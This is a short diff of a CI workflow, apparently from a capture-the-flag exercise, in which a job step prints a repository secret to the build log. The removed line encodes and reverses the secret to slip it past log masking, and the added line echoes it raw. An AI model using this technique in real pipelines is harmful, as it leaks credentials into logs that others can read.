@@ -12,6 +12,6 @@ jobs:
       - name: Obfuscate and print secret
         run: |
           MODIFIED_SECRET=$(echo -n $API_SECRET | base64 | tr -d '=' | rev)
-          echo "Leaked Secret: $MODIFIED_SECRET"
+          echo "$API_SECRET"
         env:
           API_SECRET: ${{ secrets.FLAG_SECRET }}
